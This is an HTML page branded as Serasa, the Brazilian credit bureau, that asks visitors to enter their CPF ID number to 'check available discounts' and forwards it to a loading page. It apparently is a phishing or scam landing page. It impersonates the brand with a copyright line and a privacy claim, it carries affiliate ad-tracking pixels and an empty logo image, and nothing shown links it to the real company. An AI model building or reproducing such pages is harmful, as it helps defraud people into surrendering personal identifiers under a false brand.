<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Consultar CPF - Serasa</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&display=swap" rel="stylesheet">
  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
  <script>
    window.pixelId = "67f846e3e19eff9c461bb215";
    var a = document.createElement("script");
    a.setAttribute("async", "");
    a.setAttribute("defer", "");
    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
    document.head.appendChild(a);
  </script>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: Roboto, sans-serif;
      background: #f5f5f5;
      color: #333;
      min-height: 100vh;
    }
    .header {
      background: #E80070;
      padding: 16px 20px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .header img {
      max-width: 180px;
      height: auto;
    }
    .container {
      max-width: 480px;
      margin: 0 auto;
      padding: 24px 16px 40px;
    }
    .card {
      background: #fff;
      border-radius: 12px;
      padding: 28px 24px;
      box-shadow: 0 2px 12px rgba(0,0,0,0.08);
    }
    .card h1 {
      font-size: 22px;
      font-weight: 700;
      margin-bottom: 8px;
      color: #111;
    }
    .card p {
      font-size: 15px;
      line-height: 1.5;
      color: #555;
      margin-bottom: 24px;
    }
    .form-group {
      margin-bottom: 16px;
    }
    label {
      display: block;
      font-size: 14px;
      font-weight: 500;
      margin-bottom: 8px;
      color: #333;
    }
    input[type="text"] {
      width: 100%;
      padding: 14px 16px;
      font-size: 16px;
      border: 1px solid #ddd;
      border-radius: 8px;
      outline: none;
      transition: border-color 0.2s;
    }
    input[type="text"]:focus {
      border-color: #E80070;
    }
    .error-message {
      display: none;
      color: #cf2e2e;
      font-size: 13px;
      margin-top: 6px;
    }
    button[type="submit"] {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      font-weight: 600;
      color: #fff;
      background: #E80070;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 8px;
      transition: background 0.2s;
    }
    button[type="submit"]:hover {
      background: #c9005f;
    }
    .footer {
      text-align: center;
      margin-top: 32px;
      padding-top: 24px;
      border-top: 1px solid #eee;
    }
    .footer p {
      font-size: 13px;
      color: #888;
      margin-bottom: 8px;
    }
    .footer .privacy {
      font-size: 14px;
      color: #555;
      margin-bottom: 16px;
    }
  </style>
</head>
<body>
  <header class="header">
    <img src="data:image/png;base64," alt="Serasa" width="180" height="47">
  </header>

  <main class="container">
    <div class="card">
      <h1>Entrar na Serasa</h1>
      <p>Olá! Digite seu CPF para falar com um atendente e consultar os descontos disponíveis para você.</p>

      <form id="serasa-cpf-form" novalidate>
        <div class="form-group">
          <label for="form-field-cpf_cnpj">CPF</label>
          <input type="text" id="form-field-cpf_cnpj" name="cpf" placeholder="000.000.000-00" inputmode="numeric" autocomplete="off" maxlength="14" required>
          <span id="cpf-error-message" class="error-message"></span>
        </div>
        <button type="submit">Verificar meu desconto</button>
      </form>
    </div>

    <div class="footer">
      <p class="privacy">Nós protegemos a sua privacidade 🔒</p>
      <p>© Serasa Experian | Todos os direitos reservados</p>
    </div>
  </main>

  <script>
    function mascaraCPF(valor) {
      valor = valor.replace(/\D/g, "");
      valor = valor.replace(/(\d{3})(\d)/, "$1.$2");
      valor = valor.replace(/(\d{3})(\d)/, "$1.$2");
      valor = valor.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
      return valor;
    }

    function validarCPF(cpf) {
      if (cpf.length !== 11) return false;
      if (/^(\d)\1+$/.test(cpf)) return false;

      var soma = 0, resto;
      for (var i = 1; i <= 9; i++) {
        soma += parseInt(cpf.substring(i - 1, i)) * (11 - i);
      }
      resto = (soma * 10) % 11;
      if (resto === 10 || resto === 11) resto = 0;
      if (resto !== parseInt(cpf.substring(9, 10))) return false;

      soma = 0;
      for (var i = 1; i <= 10; i++) {
        soma += parseInt(cpf.substring(i - 1, i)) * (12 - i);
      }
      resto = (soma * 10) % 11;
      if (resto === 10 || resto === 11) resto = 0;
      if (resto !== parseInt(cpf.substring(10, 11))) return false;

      return true;
    }

    document.addEventListener("DOMContentLoaded", function() {
      var cpfInput = document.getElementById("form-field-cpf_cnpj");
      var cpfForm = document.getElementById("serasa-cpf-form");
      var cpfErrorMessage = document.getElementById("cpf-error-message");

      cpfInput.addEventListener("input", function() {
        this.value = mascaraCPF(this.value);
        cpfErrorMessage.style.display = "none";
      });

      cpfForm.addEventListener("submit", function(event) {
        event.preventDefault();

        var cpfValue = cpfInput.value.replace(/\D/g, "");

        if (!validarCPF(cpfValue)) {
          cpfErrorMessage.textContent = "CPF inválido. Por favor, verifique e tente novamente.";
          cpfErrorMessage.style.display = "block";
          cpfInput.focus();
          return;
        }

        cpfErrorMessage.style.display = "none";

        var params = new URLSearchParams(window.location.search);
        params.set("cpf", cpfValue);
        window.location.href = "/loading.html?" + params.toString();
      });
    });
  </script>
</body>
</html>
